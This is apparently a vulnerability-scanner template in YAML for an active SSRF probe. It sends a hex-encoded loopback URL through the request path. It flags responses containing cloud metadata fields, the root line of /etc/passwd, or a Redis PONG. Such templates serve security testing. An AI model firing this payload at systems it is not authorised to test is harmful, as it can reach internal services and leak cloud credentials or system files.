id: ssrf5-0487
name: 'SSRF probe in path'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
description: 'Fetches internal URL via path (verify manually)'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - 'http://0x7f.0.0.1/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
